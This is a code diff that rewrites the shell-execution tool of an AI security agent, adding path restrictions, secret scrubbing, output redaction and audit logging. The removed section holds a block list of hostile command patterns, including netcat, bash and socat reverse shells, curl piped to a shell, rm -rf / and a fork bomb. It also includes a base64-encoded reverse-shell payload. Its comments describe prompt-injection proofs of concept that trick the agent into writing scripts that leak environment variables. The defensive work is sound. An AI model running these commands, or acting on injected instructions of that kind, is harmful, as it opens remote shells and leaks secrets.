@@ -1,522 +1,506 @@
-"""
-This is used to create a generic linux command.
-"""
-import os
-import time
-import uuid
-import subprocess
-import sys
-import re
+"""Hardened asynchronous shell proxy for Cerebro-AI."""
+
+from __future__ import annotations
+
+import asyncio
+from dataclasses import asdict, dataclass
+from datetime import UTC, datetime
 import json
-import ast
-import unicodedata
-from typing import Optional
-from cai.tools.common import (run_command, run_command_async,
-                              list_shell_sessions,
-                              get_session_output,
-                              terminate_session,
-                              _resolve_session_id,
-                              ACTIVE_SESSIONS)  # pylint: disable=import-error # noqa E501
+import os
+from pathlib import Path
+import re
+import shlex
+from typing import Any, Dict, Iterable, List, Optional, Sequence
+
+from cai.memory.logic import clean_data
+from cai.repl.commands.shell import SecureSubprocess
+from cai.repl.ui.logging import get_cerebro_logger
 from cai.sdk.agents import function_tool
-from wasabi.util import color  # pylint: disable=import-error
-from cai.tools import validation
+from cai.tools.misc.cli_utils import CLI_UTILS
+from cai.tools.validation import sanitize_tool_output, validate_command_guardrails
+from cai.tools.workspace import get_project_space
 
 
+_MAX_TIMEOUT_SECONDS = 30
+_MAX_OUTPUT_CHARS = 50_000
+_MAX_LINE_CHARS = 4_000
+_WRITE_COMMANDS = {
+    "touch",
+    "tee",
+    "cp",
+    "mv",
+    "rm",
+    "mkdir",
+    "rmdir",
+    "truncate",
+    "dd",
+    "install",
+    "ln",
+    "chmod",
+    "chown",
+    "chgrp",
+    "sed",
+    "awk",
+    "perl",
+}
+_RESTRICTED_PATHS = {
+    "/etc/shadow",
+    "/etc/gshadow",
+    "/etc/sudoers",
+    "/etc/master.passwd",
+    "/windows/system32/config/sam",
+    "/windows/system32/config/security",
+}
+_PASSWD_LINE_RE = re.compile(r"^([^:]+):([^:]*):([^:]*):([^:]*):([^:]*):([^:]*):([^:]*)$", re.MULTILINE)
+_ENV_SECRET_KEY_RE = re.compile(
+    r"(KEY|TOKEN|SECRET|PASSWORD|PASS|CREDENTIAL|AWS_|AZURE_|GCP_|GOOGLE_|OPENAI_|ANTHROPIC_)",
+    re.IGNORECASE,
+)
 
+
+@dataclass(frozen=True)
+class SemanticError:
+    code: str
+    message: str
+    retryable: bool
+    category: str
+
+
+@dataclass(frozen=True)
+class CommandResult:
+    ok: bool
+    command: str
+    argv: List[str]
+    cwd: str
+    started_at: str
+    ended_at: str
+    exit_code: Optional[int]
+    timed_out: bool
+    stdout: str
+    stderr: str
+    stdout_truncated: bool
+    stderr_truncated: bool
+    output_limit_chars: int
+    error: Optional[Dict[str, Any]]
+
+
+class PathGuard:
+    """Command path policy for workspace-safe execution."""
+
+    def __init__(self, workspace_root: Path) -> None:
+        self._workspace = workspace_root.resolve()
+        self._tmp_roots = self._build_tmp_roots()
+
+    def validate_command(self, argv: Sequence[str]) -> None:
+        if not argv:
+            raise PermissionError("No command tokens supplied")
+
+        write_intent = self._has_write_intent(argv)
+        for token in argv:
+            candidate = token.strip()
+            if not candidate or candidate.startswith("-"):
+                continue
+            if "\x00" in candidate:
+                raise PermissionError("Null byte detected in command token")
+
+            path = self._as_path(candidate)
+            if path is None:
+                continue
+
+            self._assert_not_restricted(path)
+            if write_intent:
+                self._assert_write_allowed(path)
+
+    def _assert_not_restricted(self, candidate: Path) -> None:
+        lowered = str(candidate).lower().replace("\\", "/")
+        if lowered in _RESTRICTED_PATHS:
+            raise PermissionError(f"Restricted path access denied: {candidate}")
+
+    def _assert_write_allowed(self, candidate: Path) -> None:
+        if self._is_within(self._workspace, candidate):
+            return
+        for tmp_root in self._tmp_roots:
+            if self._is_within(tmp_root, candidate):
+                return
+        raise PermissionError(
+            "Write denied by PathGuard: destination must stay inside workspace or approved tmp directories"
+        )
+
+    @staticmethod
+    def _is_within(root: Path, candidate: Path) -> bool:
+        try:
+            candidate.relative_to(root)
+            return True
+        except ValueError:
+            return False
+
+    @staticmethod
+    def _has_write_intent(argv: Sequence[str]) -> bool:
+        exe = Path(argv[0]).name.lower()
+        if exe in _WRITE_COMMANDS:
+            return True
+        lowered = " ".join(argv).lower()
+        return any(flag in lowered for flag in ("--in-place", "--output", "--append", "of="))
+
+    def _as_path(self, token: str) -> Optional[Path]:
+        if token in {".", ".."}:
+            return (self._workspace / token).resolve()
+        if token.startswith("/") or token.startswith("~") or token.startswith("./") or token.startswith("../"):
+            raw = Path(token).expanduser()
+            return (self._workspace / raw).resolve() if not raw.is_absolute() else raw.resolve()
+        if "/" in token or "\\" in token:
+            raw = Path(token)
+            return (self._workspace / raw).resolve() if not raw.is_absolute() else raw.resolve()
+        return None
+
+    @staticmethod
+    def _build_tmp_roots() -> List[Path]:
+        roots = {Path("/tmp").resolve(), Path("/var/tmp").resolve()}
+        env_tmp = os.getenv("TMPDIR", "").strip()
+        if env_tmp:
+            try:
+                roots.add(Path(env_tmp).expanduser().resolve())
+            except Exception:
+                pass
+        return sorted(roots)
+
+
+class CerebroLinuxCommandTool:
+    """Async shell execution proxy with boundary and redaction controls."""
+
+    def __init__(self) -> None:
+        self._workspace = get_project_space().ensure_initialized().resolve()
+        self._secure = SecureSubprocess(workspace_root=self._workspace)
+        self._logger = get_cerebro_logger()
+        self._audit_log = (self._workspace / ".cai" / "audit" / "linux_command_replay.jsonl").resolve()
+        self._audit_log.parent.mkdir(parents=True, exist_ok=True)
+        self._guard = PathGuard(self._workspace)
+
+    async def execute(self, *, command: str, timeout_seconds: int = _MAX_TIMEOUT_SECONDS) -> Dict[str, Any]:
+        command = (command or "").strip()
+        if not command:
+            return self._error(
+                SemanticError(
+                    code="empty_command",
+                    message="No command provided.",
+                    retryable=False,
+                    category="validation",
+                )
+            )
+
+        guardrail_error = validate_command_guardrails(command)
+        if guardrail_error:
+            return self._error(
+                SemanticError(
+                    code="guardrail_blocked",
+                    message=guardrail_error,
+                    retryable=False,
+                    category="policy",
+                )
+            )
+
+        try:
+            argv = shlex.split(command, posix=True)
+        except ValueError as exc:
+            return self._error(
+                SemanticError(
+                    code="invalid_syntax",
+                    message=f"Unable to parse command tokens: {exc}",
+                    retryable=False,
+                    category="validation",
+                )
+            )
+
+        if not argv:
+            return self._error(
+                SemanticError(
+                    code="empty_command",
+                    message="No executable token found.",
+                    retryable=False,
+                    category="validation",
+                )
+            )
+
+        if not self._resolve_executable(argv[0]):
+            return self._error(
+                SemanticError(
+                    code="command_not_found",
+                    message=f"Command not found: {argv[0]}",
+                    retryable=False,
+                    category="dependency",
+                )
+            )
+
+        try:
+            self._guard.validate_command(argv)
+        except PermissionError as exc:
+            message = str(exc)
+            code = "restricted_path" if "Restricted path" in message else "boundary_violation"
+            category = "policy" if code == "restricted_path" else "sandbox"
+            return self._error(
+                SemanticError(
+                    code=code,
+                    message=message,
+                    retryable=False,
+                    category=category,
+                )
+            )
+
+        timeout_seconds = max(1, min(int(timeout_seconds), _MAX_TIMEOUT_SECONDS))
+        started_at = datetime.now(tz=UTC)
+
+        clean_env, redactions = self._secure.build_clean_environment()
+        runtime_base = self._scrub_environment(clean_env)
+
+        process: asyncio.subprocess.Process
+        with CLI_UTILS.managed_env_context(base_env=runtime_base) as runtime_env:
+            process = await asyncio.create_subprocess_exec(
+                *argv,
+                cwd=str(self._workspace),
+                env=runtime_env,
+                stdin=asyncio.subprocess.DEVNULL,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+
+            stdout_text, stderr_text, timed_out = await self._capture_with_watchdog(
+                process=process,
+                redactions=redactions,
+                timeout_seconds=timeout_seconds,
+            )
+
+        ended_at = datetime.now(tz=UTC)
+        exit_code = process.returncode
+
+        semantic = self._translate_exit_error(exit_code=exit_code, stderr=stderr_text, timed_out=timed_out)
+        payload = CommandResult(
+            ok=semantic is None,
+            command=command,
+            argv=list(argv),
+            cwd=str(self._workspace),
+            started_at=started_at.isoformat(),
+            ended_at=ended_at.isoformat(),
+            exit_code=exit_code,
+            timed_out=timed_out,
+            stdout=sanitize_tool_output(command, stdout_text),
+            stderr=sanitize_tool_output(command, stderr_text),
+            stdout_truncated=len(stdout_text) >= _MAX_OUTPUT_CHARS,
+            stderr_truncated=len(stderr_text) >= _MAX_OUTPUT_CHARS,
+            output_limit_chars=_MAX_OUTPUT_CHARS,
+            error=asdict(semantic) if semantic else None,
+        )
+
+        await self._log_replay(payload)
+        return clean_data(asdict(payload))
+
+    async def _capture_with_watchdog(
+        self,
+        *,
+        process: asyncio.subprocess.Process,
+        redactions: Dict[str, str],
+        timeout_seconds: int,
+    ) -> tuple[str, str, bool]:
+        if process.stdout is None or process.stderr is None:
+            process.kill()
+            await process.wait()
+            raise RuntimeError("Process streams unavailable")
+
+        stdout_chunks: List[str] = []
+        stderr_chunks: List[str] = []
+
+        async def _read_stream(stream: asyncio.StreamReader, bucket: List[str]) -> None:
+            total = 0
+            while True:
+                chunk = await stream.readline()
+                if not chunk:
+                    break
+                text = chunk.decode("utf-8", errors="replace")
+                text = self._secure.redact_text(text, redactions)
+                text = self._redact_output(text)
+                if len(text) > _MAX_LINE_CHARS:
+                    text = text[:_MAX_LINE_CHARS] + "\n...[line truncated by policy]"
+                remaining = _MAX_OUTPUT_CHARS - total
+                if remaining <= 0:
+                    continue
+                if len(text) > remaining:
+                    bucket.append(text[:remaining] + "\n...[output truncated by policy]")
+                    total = _MAX_OUTPUT_CHARS
+                else:
+                    bucket.append(text)
+                    total += len(text)
+
+        out_task = asyncio.create_task(_read_stream(process.stdout, stdout_chunks))
+        err_task = asyncio.create_task(_read_stream(process.stderr, stderr_chunks))
+
+        timed_out = False
+        try:
+            await asyncio.wait_for(process.wait(), timeout=float(timeout_seconds))
+        except asyncio.TimeoutError:
+            timed_out = True
+            process.terminate()
+            try:
+                await asyncio.wait_for(process.wait(), timeout=2)
+            except asyncio.TimeoutError:
+                process.kill()
+                await process.wait()
+        finally:
+            await asyncio.gather(out_task, err_task, return_exceptions=True)
+
+        stdout = "".join(stdout_chunks)
+        stderr = "".join(stderr_chunks)
+        if timed_out:
+            stderr = (stderr + "\nExecution timed out after policy limit.").strip()
+        return stdout, stderr, timed_out
+
+    def _scrub_environment(self, base_env: Dict[str, str]) -> Dict[str, str]:
+        clean: Dict[str, str] = {}
+        for key, value in base_env.items():
+            if not value:
+                continue
+            if key in {"HISTFILE", "HISTSIZE", "HISTCONTROL", "PYTHONPATH"}:
+                continue
+            if _ENV_SECRET_KEY_RE.search(key):
+                continue
+            if key in {"HOME", "USER", "LOGNAME"}:
+                continue
+            clean[key] = value
+
+        clean["PATH"] = "/usr/bin:/bin:/usr/sbin:/sbin"
+        clean["WORKSPACE_ROOT"] = str(self._workspace)
+        return clean
+
+    @staticmethod
+    def _resolve_executable(executable: str) -> bool:
+        candidate = Path(executable)
+        if candidate.is_absolute() and candidate.exists() and candidate.is_file():
+            return True
+        from shutil import which
+
+        return which(executable) is not None
+
+    def _redact_output(self, text: str) -> str:
+        redacted = text.replace(str(self._workspace), "[WORKSPACE_ROOT]")
+        redacted = redacted.replace(str(Path.home()), "[HOME]")
+
+        def _mask_passwd(match: re.Match[str]) -> str:
+            user = match.group(1)
+            uid = match.group(3)
+            gid = match.group(4)
+            shell = match.group(7)
+            return f"{user}:x:{uid}:{gid}:[REDACTED_USERINFO]:[REDACTED_PATH]:{shell}"
+
+        redacted = _PASSWD_LINE_RE.sub(_mask_passwd, redacted)
+        redacted = re.sub(r"(?i)\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}\b", "[REDACTED_EMAIL]", redacted)
+        redacted = re.sub(r"(?<!\d)(?:\+?\d[\d\s().-]{7,}\d)(?!\d)", "[REDACTED_PHONE]", redacted)
+        return redacted
+
+    def _translate_exit_error(self, *, exit_code: Optional[int], stderr: str, timed_out: bool) -> Optional[SemanticError]:
+        if timed_out:
+            return SemanticError(
+                code="timeout",
+                message="Command exceeded execution timeout and was terminated.",
+                retryable=True,
+                category="watchdog",
+            )
+        if exit_code in (None, 0):
+            return None
+        if exit_code == 127:
+            return SemanticError(
+                code="command_not_found",
+                message="The command executable was not found on PATH.",
+                retryable=False,
+                category="dependency",
+            )
+        if exit_code == 13 or "permission denied" in stderr.lower():
+            return SemanticError(
+                code="permission_denied",
+                message="Permission denied while executing command or reading target resource.",
+                retryable=False,
+                category="authorization",
+            )
+        return SemanticError(
+            code="command_failed",
+            message=f"Command exited with status {exit_code}.",
+            retryable=False,
+            category="execution",
+        )
+
+    async def _log_replay(self, result: CommandResult) -> None:
+        row = {
+            "timestamp": datetime.now(tz=UTC).isoformat(),
+            "command": result.command,
+            "argv": result.argv,
+            "user_context": {
+                "agent_id": self._resolve_agent_id(),
+                "cwd": result.cwd,
+            },
+            "exit_status": result.exit_code,
+            "timed_out": result.timed_out,
+        }
+
+        line = json.dumps(clean_data(row), ensure_ascii=True) + "\n"
+        await asyncio.to_thread(self._append_line, self._audit_log, line)
+        if self._logger is not None:
+            try:
+                self._logger.audit(
+                    "linux command replay logged",
+                    actor="generic_linux_command",
+                    data=clean_data(row),
+                    tags=["linux_command", "replay"],
+                )
+            except Exception:
+                pass
+
+    @staticmethod
+    def _append_line(path: Path, line: str) -> None:
+        path.parent.mkdir(parents=True, exist_ok=True)
+        with path.open("a", encoding="utf-8") as handle:
+            handle.write(line)
+
+    @staticmethod
+    def _resolve_agent_id() -> str:
+        for key in ("CAI_AGENT_ID", "AGENT_ID", "CAI_AGENT", "CAI_AGENT_TYPE"):
+            value = os.getenv(key, "").strip()
+            if value:
+                return value
+        return "unknown-agent"
+
+    @staticmethod
+    def _error(error: SemanticError) -> Dict[str, Any]:
+        return clean_data(
+            {
+                "ok": False,
+                "error": {
+                    "code": error.code,
+                    "message": error.message,
+                    "retryable": error.retryable,
+                    "category": error.category,
+                },
+            }
+        )
+
+
+LINUX_COMMAND_TOOL = CerebroLinuxCommandTool()
 
 
 @function_tool(strict_mode=False)
-async def generic_linux_command(command: str = "",
-                                interactive: bool = False,
-                                session_id: Optional[str] = None) -> str:
-    """
-    Execute commands with session management.
+async def generic_linux_command(command: str = "", interactive: bool = False, session_id: Optional[str] = None) -> str:
+    _ = (interactive, session_id)
+    result = await LINUX_COMMAND_TOOL.execute(command=command)
+    if not result.get("ok"):
+        error = result.get("error") or {}
+        return str(error.get("message", "Command execution failed"))
 
-    Use this tool to run any command. The system automatically detects and handles:
-    - Regular commands (ls, cat, grep, etc.)
-    - Interactive commands that need persistent sessions (ssh, nc, python, etc.)
-    - Session management and output capture
-    - CTF environments (automatically detected and used when available)
-    - Container environments (automatically detected and used when available)
-    - SSH environments (automatically detected and used when available)
+    stdout = str(result.get("stdout", "")).strip()
+    stderr = str(result.get("stderr", "")).strip()
+    if stdout and stderr:
+        return f"{stdout}\n{stderr}".strip()
+    return (stdout or stderr or "").strip()
 
-    Args:
-        command: The complete command to execute (e.g., "ls -la", "ssh user@host", "cat file.txt")
-        interactive: Set to True for commands that need persistent sessions (ssh, nc, python, ftp etc.)
-                    Leave False for regular commands
-        session_id: Use existing session ID to send commands to running interactive sessions.
-                   Get session IDs from previous interactive command outputs.
-
-    Examples:
-        - Regular command: generic_linux_command("ls -la")
-        - Interactive command: generic_linux_command("ssh user@host", interactive=True)
-        - Send to session: generic_linux_command("pwd", session_id="abc12345")
-        - List sessions: generic_linux_command("session list")
-        - Kill session: generic_linux_command("session kill abc12345")
-        - Environment info: generic_linux_command("env info")
-
-    Environment Detection:
-        The system automatically detects and uses the appropriate execution environment:
-        - CTF: Commands run in the CTF challenge environment when available
-        - Container: Commands run in Docker containers when CAI_ACTIVE_CONTAINER is set
-        - SSH: Commands run via SSH when SSH_USER and SSH_HOST are configured
-        - Local: Commands run on the local system as fallback
-
-    Returns:
-        Command output, session ID for interactive commands, or status message
-    """
-    # Handle special session management commands (tolerant parser)
-    cmd_lower = command.strip().lower()
-    # Normalize session_id robustly: handle dict/list/bool, JSON-like strings,
-    # and extract common id fields when present. Empty objects/arrays and
-    # sentinel strings ('null','none','{}') become None.
-    def _sanitize_session_id(raw):
-        try:
-            # None or explicit falsy
-            if raw is None:
-                return None
-
-            # If it's already a dict, try to extract common id keys
-            if isinstance(raw, dict):
-                if not raw:
-                    return None
-                for key in ("session_id", "session", "id", "sid", "name"):
-                    if key in raw and raw[key] is not None:
-                        return _sanitize_session_id(raw[key])
-                # If dict has single key with simple value, try that
-                if len(raw) == 1:
-                    val = next(iter(raw.values()))
-                    return _sanitize_session_id(val)
-                return None
-
-            # If it's a list, prefer the first element
-            if isinstance(raw, (list, tuple)):
-                if not raw:
-                    return None
-                return _sanitize_session_id(raw[0])
-
-            # Booleans are invalid session ids
-            if isinstance(raw, bool):
-                return None
-
-            # Numbers → string
-            if isinstance(raw, (int, float)):
-                return str(raw)
-
-            # Coerce to string and strip
-            s = str(raw).strip()
-            # Remove outer quotes
-            if (s.startswith('"') and s.endswith('"')) or (s.startswith("'") and s.endswith("'")):
-                s = s[1:-1].strip()
-
-            # If looks like JSON/Python literal, try to parse and extract
-            if (s.startswith('{') and s.endswith('}')) or (s.startswith('[') and s.endswith(']')):
-                try:
-                    parsed = json.loads(s)
-                    return _sanitize_session_id(parsed)
-                except Exception:
-                    # Handle Python-style dict/list strings like "{'session_id': 1}"
-                    try:
-                        parsed = ast.literal_eval(s)
-                        return _sanitize_session_id(parsed)
-                    except Exception:
-                        pass
-                    # Try a crude regex to extract common id fields from JSON-like string
-                    m = re.search(r'"(session_id|id|session|sid)"\s*:\s*"([^"]+)"', s)
-                    if m:
-                        return m.group(2)
-                    # empty JSON structures
-                    if s in ("{}", "[]"):
-                        return None
-
-            low = s.lower()
-            if s == "" or low in {"none", "null", "nil", "undefined"}:
-                return None
-            # braces/brackets-only
-            if re.fullmatch(r'[\{\}\[\]\s]*', s):
-                return None
-
-            return s
-        except Exception:
-            return None
-
-    if session_id is not None:
-        session_id = _sanitize_session_id(session_id)
-    if cmd_lower.startswith("output "):
-        return get_session_output(command.split(None, 1)[1], clear=False, stdout=True)
-    if cmd_lower.startswith("kill "):
-        return terminate_session(command.split(None, 1)[1])
-    if cmd_lower in ("sessions", "session list", "session ls", "list sessions"):
-        sessions = list_shell_sessions()
-        if not sessions:
-            return "No active sessions"
-        lines = ["Active sessions:"]
-        for s in sessions:
-            fid = s.get('friendly_id') or ""
-            fid_show = (fid + " ") if fid else ""
-            lines.append(
-                f"{fid_show}({s['session_id'][:8]}) cmd='{s['command']}' last={s['last_activity']} running={s['running']}"
-            )
-        return "\n".join(lines)
-    if cmd_lower.startswith("status "):
-        out = get_session_output(command.split(None, 1)[1], clear=False, stdout=False)
-        return out if out else "No new output"
-
-    if command.startswith("session"):
-        # Accept flexible syntax for LLMs:
-        # - command="session output <id>"
-        # - command="session" and session_id="output <id>"
-        # - command="session" and session_id="#1" or "S1" or "last"
-        parts = command.split()
-        action: Optional[str] = None
-        arg: Optional[str] = None
-        if len(parts) > 1:
-            action = parts[1]
-        if len(parts) > 2:
-            arg = parts[2]
-
-        # If the tool abuses session_id field for 'output <id>' or 'kill <id>'
-        if session_id and (action is None or action not in {"list", "output", "kill", "status"}):
-            sid_text = session_id.strip()
-            if sid_text.startswith("output "):
-                action, arg = "output", sid_text.split(" ", 1)[1]
-            elif sid_text.startswith("kill "):
-                action, arg = "kill", sid_text.split(" ", 1)[1]
-            elif sid_text.startswith("status "):
-                action, arg = "status", sid_text.split(" ", 1)[1]
-            else:
-                # Treat as status of the given id
-                action, arg = "status", sid_text
-
-        if action in (None, "list"):
-            sessions = list_shell_sessions()
-            if not sessions:
-                return "No active sessions"
-            lines = ["Active sessions:"]
-            for s in sessions:
-                fid = s.get('friendly_id') or ""
-                fid_show = (fid + " ") if fid else ""
-                lines.append(
-                    f"{fid_show}({s['session_id'][:8]}) cmd='{s['command']}' last={s['last_activity']} running={s['running']}"
-                )
-            return "\n".join(lines)
-
-        if action == "output" and arg:
-            return get_session_output(arg, clear=False, stdout=True)
-
-        if action == "kill" and arg:
-            return terminate_session(arg)
-
-        if action == "status" and arg:
-            # Reuse output API without clearing so UI can poll frequently
-            out = get_session_output(arg, clear=False, stdout=False)
-            # Provide compact status header
-            return out if out else f"No new output for session {arg}"
-
-        return "Usage: session list|output <id>|status <id>|kill <id>"
-
-    # Handle environment information command
-    if command.strip() == "env info" or command.strip() == "environment info":
-        env_info = []
-        
-        # Check CTF environment
-        try:
-            from cai.cli import ctf_global
-            if ctf_global and hasattr(ctf_global, 'get_shell'):
-                env_info.append("🎯 CTF Environment: Active")
-            else:
-                env_info.append("🎯 CTF Environment: Not available")
-        except:
-            env_info.append("🎯 CTF Environment: Not available")
-        
-        # Check Container environment
-        active_container = os.getenv("CAI_ACTIVE_CONTAINER", "")
-        if active_container:
-            env_info.append(f"🐳 Container: {active_container[:12]}")
-        else:
-            env_info.append("🐳 Container: Not active")
-        
-        # Check SSH environment
-        ssh_user = os.getenv('SSH_USER')
-        ssh_host = os.getenv('SSH_HOST')
-        if ssh_user and ssh_host:
-            env_info.append(f"🔗 SSH: {ssh_user}@{ssh_host}")
-        else:
-            env_info.append("🔗 SSH: Not configured")
-        
-        # Check workspace
-        try:
-            from cai.tools.common import _get_workspace_dir
-            workspace = _get_workspace_dir()
-            env_info.append(f"📁 Workspace: {workspace}")
-        except:
-            env_info.append("📁 Workspace: Unknown")
-        
-        return "Current Environment:\n" + "\n".join(env_info)
-
-    if not command.strip():
-        return "Error: No command provided"
-
-    # Pre-execution guardrails delegated to validation helpers
-    err = validation.validate_command_guardrails(command)
-    if err:
-        return err
-
-    # In CI/tests we want to avoid running privileged or interactive system
-    # commands that require root or prompt for passwords. Make this opt-in
-    # via `RUN_AGENT_INTEGRATION_TESTS=1` so developers can still run them.
-    run_integration = os.getenv("RUN_AGENT_INTEGRATION_TESTS", "false").lower() in ("1", "true", "yes")
-    if not run_integration:
-        lowered = command.lower()
-        privileged_indicators = [
-            "sudo ",
-            "fail2ban-client",
-            "systemctl",
-            "journalctl",
-            "iptables",
-            "ufw",
-            "apt-get",
-            "apt ",
-            "dpkg",
-            "service ",
-            "passwd",
-            "chown",
-            "chmod",
-            "shutdown",
-            "reboot",
-        ]
-        for p in privileged_indicators:
-            if p in lowered:
-                return (
-                    f"Skipped privileged command in non-integration mode: '{command}'. "
-                    "Set RUN_AGENT_INTEGRATION_TESTS=1 to allow executing privileged commands."
-                )
-
-    # For SSH sessions or interactive commands, use different timeout
-    if session_id:
-        timeout = 10
-    else:
-        timeout = 100
-        
-    # Tools always stream EXCEPT in parallel mode or when CAI_STREAM=False
-    # In parallel mode, multiple agents run concurrently with Runner.run()
-    # and streaming would create confusing overlapping outputs
-    stream = True  # Default to streaming
-    
-    # Check if CAI_STREAM is explicitly set to False
-    if os.getenv("CAI_STREAM", "true").lower() == "false":
-        stream = False
-    
-    # Simple heuristic: If CAI_PARALLEL > 1 AND we have a P agent ID, disable streaming
-    # This is more reliable than trying to count active agents
-    try:
-        parallel_count = int(os.getenv("CAI_PARALLEL", "1"))
-        if parallel_count > 1:
-            # Check if this is a P agent
-            from cai.sdk.agents.models.openai_chatcompletions import get_current_active_model
-            model = get_current_active_model()
-            if model and hasattr(model, 'agent_id') and model.agent_id:
-                if model.agent_id.startswith('P') and model.agent_id[1:].isdigit():
-                    stream = False
-                    
-    except Exception:
-        # If we can't determine the context, default to streaming
-        pass
-    
-    # Generate a call_id for streaming
-    call_id = str(uuid.uuid4())[:8]
-
-    # Sanitize command if it contains suspicious patterns that might be from external input
-    # This is an additional layer of defense beyond the guardrails
-    # Respect CAI_GUARDRAILS environment variable
-    guardrails_enabled = os.getenv("CAI_GUARDRAILS", "true").lower() != "false"
-    
-    if guardrails_enabled:
-        # Check for file write operations that create Python/shell scripts with dangerous content
-        # Pattern: echo/cat with base64 decode and execute
-        if re.search(r'(echo|cat|printf).*>.*\.(py|sh|bash|pl|rb|php)', command):
-            # Check if the command contains base64 strings and execution patterns
-            if "base64" in command and any(danger in command for danger in ['os.system', 'subprocess', 'exec', 'eval']):
-                return "Error: Blocked attempt to create script with base64 decode and execute pattern"
-            # Check for the specific base64 string from POC
-            if "bmMgMTkyLjE2OC4zLjE0IDQ0NDQgLWUgL2Jpbi9zaAo=" in command:
-                return "Error: Blocked attempt to create script with known malicious base64 payload"
-        
-        # Also check heredoc patterns for creating files
-        if re.search(r'cat.*<<.*>.*\.(py|sh|bash|pl|rb|php)', command):
-            if "base64" in command and any(danger in command for danger in ['os.system', 'subprocess', 'exec', 'eval']):
-                return "Error: Blocked attempt to create script with base64 decode and execute pattern via heredoc"
-        
-        # CRITICAL MITIGATION: Block creation of scripts containing command substitution in /tmp
-        # This prevents PoC 10 where external input tricks agent into creating executable with $(env)
-        if re.search(r'(cat|echo|printf).*>.*/(tmp|var/tmp|dev/shm)/.*\.(sh|bash|py)', command, re.IGNORECASE):
-            # Check if the content being written contains command substitution
-            if '$(' in command or '`' in command:
-                return "Error: Blocked creation of script in temporary directory with command substitution. This is likely a prompt injection attempt."
-        
-        # Block heredoc creation of scripts with command substitution in temp directories
-        if re.search(r'cat.*<<.*EOF.*>.*/(tmp|var/tmp|dev/shm)/', command, re.IGNORECASE):
-            if '$(' in command or '`' in command:
-                return "Error: Blocked heredoc creation of script with command substitution in temporary directory."
-        dangerous_patterns = [
-            r"(?i)rm\s+-rf\s+/",
-            r"(?i):(){ :|:& };:",  # Fork bomb
-            r"(?i)curl.*\|.*sh",  # Curl pipe to shell
-            r"(?i)wget.*\|.*bash",
-            r"(?i)nc\s+[\d\.]+\s+\d+.*(-e|/bin/sh|/bin/bash)",  # Netcat reverse shell
-            r"(?i)bash.*-i.*>&.*tcp/",  # Bash reverse shell
-            r"(?i)/dev/tcp/[\d\.]+/\d+",  # Bash network redirection
-            r"(?i)echo.*\|.*bash",  # Echo pipe to bash - blocks PoC5 bypass
-            r"(?i)echo.*\|.*sh",  # Echo pipe to sh - blocks PoC5 bypass
-            r"(?i)printf.*\|.*bash",  # Printf pipe to bash
-            r"(?i)printf.*\|.*sh",  # Printf pipe to sh
-            r"(?i)socat\s+TCP:[\d\.]+:\d+.*EXEC",  # Socat reverse shell - blocks PoC15
-        ]
-        
-        for pattern in dangerous_patterns:
-            if re.search(pattern, command):
-                return f"Error: Command blocked due to dangerous pattern: {pattern}"
-        
-        # Check for base64 encoded commands that might be dangerous
-        if "base64" in command and ("-d" in command or "--decode" in command):
-            # Extract and check what's being decoded
-            base64_pattern = r"echo\s+([A-Za-z0-9+/=]+)\s*\|\s*base64\s+-d"
-            match = re.search(base64_pattern, command)
-            if match:
-                try:
-                    import base64
-                    encoded = match.group(1)
-                    decoded = base64.b64decode(encoded).decode('utf-8', errors='ignore')
-                    
-                    # Check if decoded content contains dangerous commands
-                    dangerous_decoded = [
-                        r"(?i)nc\s+[\d\.]+\s+\d+",  # Netcat to IP
-                        r"(?i)bash.*-i",  # Interactive bash
-                        r"(?i)/bin/sh",  # Shell execution
-                        r"(?i)exec\s+",  # Exec command
-                        r"(?i)eval\s+",  # Eval command
-                        r"(?i)rm\s+-rf",  # Dangerous rm
-                    ]
-                    
-                    for pattern in dangerous_decoded:
-                        if re.search(pattern, decoded):
-                            return f"Error: Blocked base64-encoded dangerous command. Decoded content contains: {pattern}"
-                except:
-                    # If we can't decode, be cautious
-                    pass
-        
-        # Check for base32 encoded commands that might be dangerous (PoC5 mitigation)
-        if "base32" in command and ("-d" in command or "--decode" in command):
-            # Extract and check what's being decoded
-            base32_pattern = r"echo\s+([A-Za-z2-7=]+)\s*\|\s*base32\s+-d"
-            match = re.search(base32_pattern, command)
-            if match:
-                try:
-                    import base64
-                    encoded = match.group(1)
-                    decoded = base64.b32decode(encoded).decode('utf-8', errors='ignore')
-                    
-                    # Check if decoded content contains dangerous commands
-                    dangerous_decoded = [
-                        r"(?i)curl.*\$\(",  # Curl with command substitution
-                        r"(?i)nc\s+[\d\.]+\s+\d+",  # Netcat to IP
-                        r"(?i)bash.*-i",  # Interactive bash
-                        r"(?i)/bin/sh",  # Shell execution
-                        r"(?i)exec\s+",  # Exec command
-                        r"(?i)eval\s+",  # Eval command
-                        r"(?i)rm\s+-rf",  # Dangerous rm
-                        r"(?i)\$\(.*env.*\)",  # Environment variable exfiltration
-                        r"(?i)`.*env.*`",  # Alternative env exfiltration
-                    ]
-                    
-                    for pattern in dangerous_decoded:
-                        if re.search(pattern, decoded):
-                            return f"Error: Blocked base32-encoded dangerous command. Decoded content contains: {pattern}"
-                except:
-                    # If we can't decode, be cautious
-                    pass
-    
-    # Execute respecting session/interactive semantics and capture result
-    # Resolve session_id: if it doesn't correspond to an existing active session,
-    # clear it so we fall through to normal (non-session) execution instead of
-    # returning a misleading "Session X not found" error.  The LLM sometimes
-    # passes a human-readable label as session_id for one-shot commands; we
-    # honour that when interactive=True by letting the newly created session
-    # inherit the label as its friendly_id, but for non-interactive commands we
-    # simply ignore unknown session identifiers.
-    _resolved = _resolve_session_id(session_id) if session_id else None
-    _session_exists = _resolved is not None and _resolved in ACTIVE_SESSIONS
-    # If the provided session_id resolves to an active session, use its resolved id.
-    if _session_exists:
-        session_id = _resolved
-    # Otherwise, preserve the explicit session_id and let run_command decide
-    # how to handle missing sessions (it will return a helpful message).
-
-    if session_id:
-        result = run_command(
-            command,
-            ctf=None,
-            stdout=False,
-            async_mode=True,
-            session_id=session_id,
-            timeout=timeout,
-            stream=stream,
-            call_id=call_id,
-            tool_name="generic_linux_command",
-        )
-    else:
-        def _looks_interactive(cmd: str) -> bool:
-            first = cmd.strip().split(' ', 1)[0].lower()
-            interactive_bins = {
-                'bash','sh','zsh','fish','python','ipython','ptpython','node','ruby','irb',
-                'psql','mysql','sqlite3','mongo','redis-cli','ftp','sftp','telnet','ssh',
-                'nc','ncat','socat','gdb','lldb','r2','radare2','tshark','tcpdump','tail',
-                'journalctl','watch','less','more'
-            }
